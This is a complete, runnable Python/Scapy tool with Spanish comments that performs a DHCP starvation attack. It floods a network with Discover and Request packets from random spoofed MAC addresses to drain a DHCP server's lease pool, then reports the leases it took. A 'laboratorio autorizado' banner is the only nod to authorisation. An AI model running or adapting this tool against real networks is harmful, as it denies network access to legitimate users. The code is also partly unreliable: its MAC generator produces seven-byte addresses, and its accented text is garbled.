#!/usr/bin/env python3
"""
DHCP Starvation - Versi�n Profesional Corregida
"""

import os
import random
import signal
import subprocess
import sys
import time

from scapy.all import (
    BOOTP, DHCP, Ether, IP, UDP, AsyncSniffer, conf,
    get_if_hwaddr, sendp
)

# Variable global para control de ejecuci�n
running = True
responses = {}


def signal_handler(sig, frame):
    """Maneja Ctrl+C de forma elegante"""
    global running
    running = False
    print("\n[!] Deteniendo ataque...")


# Registrar manejadores de se�ales
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def require_root():
    """Verifica privilegios de root"""
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 dhcp_starvation.py")
        sys.exit(1)


def run_cmd(cmd):
    """Ejecuta comando y retorna salida"""
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""


def list_interfaces():
    """Lista interfaces de red disponibles"""
    return [i for i in sorted(os.listdir("/sys/class/net")) if i != "lo"]


def get_interface_info(iface):
    """Obtiene informaci�n de la interfaz"""
    info = run_cmd(["ip", "-br", "addr", "show", iface])
    return info if info else iface


def choose_interface():
    """Permite seleccionar interfaz interactivamente"""
    interfaces = list_interfaces()

    if not interfaces:
        print("[!] No se encontraron interfaces de red")
        sys.exit(1)

    print("\n[+] Interfaces disponibles:\n")

    for idx, iface in enumerate(interfaces, 1):
        print(f"  {idx}. {get_interface_info(iface)}")

    print("")

    default_iface = "eth0" if "eth0" in interfaces else interfaces[0]

    while True:
        value = input(f"[?] Selecciona interfaz [1-{len(interfaces)}] o Enter para {default_iface}: ").strip()

        if value == "":
            return default_iface

        if value.isdigit():
            pos = int(value) - 1
            if 0 <= pos < len(interfaces):
                return interfaces[pos]

        if value in interfaces:
            return value

        print("[!] Interfaz inv�lida")


def ask_int(label, default, min_val, max_val):
    """Pide entero validado"""
    while True:
        value = input(f"[?] {label} [{default}]: ").strip()

        if value == "":
            return default

        try:
            num = int(value)
            if min_val <= num <= max_val:
                return num
            print(f"[!] Debe estar entre {min_val} y {max_val}")
        except ValueError:
            print("[!] Valor inv�lido")


def ask_float(label, default, min_val, max_val):
    """Pide float validado"""
    while True:
        value = input(f"[?] {label} [{default}]: ").strip()

        if value == "":
            return default

        try:
            num = float(value)
            if min_val <= num <= max_val:
                return num
            print(f"[!] Debe estar entre {min_val} y {max_val}")
        except ValueError:
            print("[!] Valor inv�lido")


def ask_text(label, default):
    """Pide texto"""
    value = input(f"[?] {label} [{default}]: ").strip()
    return default if value == "" else value


def random_mac():
    """Genera MAC local administrada"""
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def mac_to_bytes(mac):
    """Convierte MAC string a bytes"""
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))


def get_dhcp_option(pkt, option_name):
    """Extrae opci�n DHCP del paquete"""
    if DHCP not in pkt:
        return None

    for option in pkt[DHCP].options:
        if isinstance(option, tuple) and len(option) >= 2:
            if option[0] == option_name:
                return option[1]
    return None


def get_dhcp_type(pkt):
    """Obtiene tipo de mensaje DHCP"""
    value = get_dhcp_option(pkt, "message-type")

    names = {
        1: "discover",
        2: "offer",
        3: "request",
        4: "decline",
        5: "ack",
        6: "nak",
        7: "release",
        8: "inform",
    }

    if isinstance(value, int):
        return names.get(value, str(value))
    return value


def packet_handler(pkt):
    """Procesa paquetes DHCP recibidos"""
    if BOOTP not in pkt or DHCP not in pkt:
        return

    xid = pkt[BOOTP].xid
    dhcp_type = get_dhcp_type(pkt)

    if dhcp_type not in ["offer", "ack", "nak"]:
        return

    if xid not in responses:
        responses[xid] = []

    responses[xid].append(pkt)


def wait_response(xid, valid_types, timeout):
    """Espera respuesta espec�fica del servidor DHCP"""
    global running

    end_time = time.time() + timeout

    while time.time() < end_time and running:
        packets = responses.get(xid, [])

        for pkt in packets:
            if get_dhcp_type(pkt) in valid_types:
                return pkt

        time.sleep(0.01)

    return None


def build_discover(client_mac, xid, hostname):
    """Construye paquete DHCP Discover"""
    mac_bytes = mac_to_bytes(client_mac)
    chaddr = mac_bytes + b'\x00' * 10  # 16 bytes total

    return (
        Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=chaddr, xid=xid, flags=0x8000)
        / DHCP(
            options=[
                ("message-type", "discover"),
                ("client_id", b"\x01" + mac_bytes),
                ("hostname", hostname.encode()),
                ("param_req_list", [1, 3, 6, 15, 28, 51, 54, 58, 59]),
                "end",
            ]
        )
    )


def build_request(client_mac, xid, hostname, requested_ip, server_id):
    """Construye paquete DHCP Request"""
    mac_bytes = mac_to_bytes(client_mac)
    chaddr = mac_bytes + b'\x00' * 10

    # Asegurar que server_id sea string
    if isinstance(server_id, bytes):
        server_id = server_id.decode()

    return (
        Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=chaddr, xid=xid, flags=0x8000)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("client_id", b"\x01" + mac_bytes),
                ("requested_addr", requested_ip),
                ("server_id", server_id),
                ("hostname", hostname.encode()),
                ("param_req_list", [1, 3, 6, 15, 28, 51, 54, 58, 59]),
                "end",
            ]
        )
    )


def main():
    """Funci�n principal"""
    global running

    require_root()

    print("""
+--------------------------------------------------------------+
�           DHCP STARVATION - Laboratorio Autorizado           �
�--------------------------------------------------------------�
�  Agota el pool DHCP solicitando leases con MACs aleatorias   �
+--------------------------------------------------------------+
""")

    iface = choose_interface()

    print("\n[+] Configuraci�n del ataque:\n")

    count = ask_int("Cantidad de clientes falsos", 200, 1, 5000)
    interval = ask_float("Pausa entre intentos (seg)", 0.02, 0.0, 5.0)
    offer_timeout = ask_float("Timeout para OFFER (seg)", 0.60, 0.05, 10.0)
    ack_timeout = ask_float("Timeout para ACK (seg)", 0.40, 0.05, 10.0)
    hostname_prefix = ask_text("Prefijo hostname", "LAB-CLIENT")

    # Obtener MAC real para referencia
    try:
        real_mac = get_if_hwaddr(iface)
    except:
        real_mac = "N/A"

    print(f"\n[+] Configuraci�n:")
    print(f"    Interfaz: {iface}")
    print(f"    MAC real: {real_mac}")
    print(f"    Clientes: {count}")
    print(f"    Pausa: {interval}s")
    print(f"    Timeouts: OFFER={offer_timeout}s, ACK={ack_timeout}s")
    print(f"    Hostname: {hostname_prefix}-XXX")

    input("\n[*] Presiona Enter para iniciar el ataque...")

    # Configurar Scapy
    conf.iface = iface
    conf.verb = 0

    # Iniciar sniffer
    print("\n[*] Iniciando sniffer...")
    sniffer = AsyncSniffer(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=packet_handler,
        store=False,
    )
    sniffer.start()
    time.sleep(0.3)

    # Estad�sticas
    stats = {
        'discovers': 0,
        'requests': 0,
        'offers': 0,
        'acks': 0,
        'naks': 0,
        'no_offer': 0,
        'no_ack': 0,
        'leases': []
    }

    print("[*] Ataque iniciado - Ctrl+C para detener\n")
    start_time = time.time()

    try:
        for index in range(1, count + 1):
            if not running:
                break

            client_mac = random_mac()
            hostname = f"{hostname_prefix}-{index}"
            xid = random.randint(1, 0xFFFFFFFF)

            # Enviar Discover
            discover = build_discover(client_mac, xid, hostname)
            sendp(discover, iface=iface, verbose=False)
            stats['discovers'] += 1

            # Esperar Offer
            offer = wait_response(xid, ["offer"], offer_timeout)

            if offer is None:
                stats['no_offer'] += 1
                print(f"[{index:4d}] ? SIN OFFER    - {client_mac}")
                time.sleep(interval)
                continue

            stats['offers'] += 1
            offered_ip = offer[BOOTP].yiaddr
            server_id = get_dhcp_option(offer, "server_id") or offer[IP].src

            # Enviar Request
            request = build_request(client_mac, xid, hostname, offered_ip, server_id)
            sendp(request, iface=iface, verbose=False)
            stats['requests'] += 1

            # Esperar Ack/Nak
            response = wait_response(xid, ["ack", "nak"], ack_timeout)

            if response is None:
                stats['no_ack'] += 1
                print(f"[{index:4d}] ? SIN ACK      - {offered_ip}")
            else:
                resp_type = get_dhcp_type(response)

                if resp_type == "nak":
                    stats['naks'] += 1
                    print(f"[{index:4d}] ? NAK          - {offered_ip}")
                else:
                    stats['acks'] += 1
                    stats['leases'].append((offered_ip, client_mac))
                    print(f"[{index:4d}] ? ACK          - {offered_ip} mac={client_mac}")

            time.sleep(interval)

    except KeyboardInterrupt:
        running = False

    # Detener sniffer
    try:
        sniffer.stop()
    except:
        pass

    elapsed = time.time() - start_time

    # Reporte final
    print("\n" + "="*60)
    print("RESUMEN DEL ATAQUE")
    print("="*60)
    print(f"??  Tiempo total:     {elapsed:.1f} segundos")
    print(f"?? DISCOVER:         {stats['discovers']}")
    print(f"?? OFFER recibidos:  {stats['offers']}")
    print(f"?? REQUEST:          {stats['requests']}")
    print(f"?? ACK recibidos:    {stats['acks']}")
    print(f"? NAK recibidos:    {stats['naks']}")
    print(f"??  Sin OFFER:        {stats['no_offer']}")
    print(f"??  Sin ACK:          {stats['no_ack']}")
    print(f"? �xito:            {stats['acks']}/{stats['discovers']} ({100*stats['acks']/max(stats['discovers'],1):.1f}%)")

    if stats['leases']:
        print(f"\n?? LEASES OBTENIDOS ({len(stats['leases'])}):")
        for ip, mac in stats['leases'][-20:]:
            print(f"    {ip:<15} {mac}")

        if len(stats['leases']) > 20:
            print(f"    ... y {len(stats['leases'])-20} m�s")

    print("="*60)


if __name__ == "__main__":
    main()

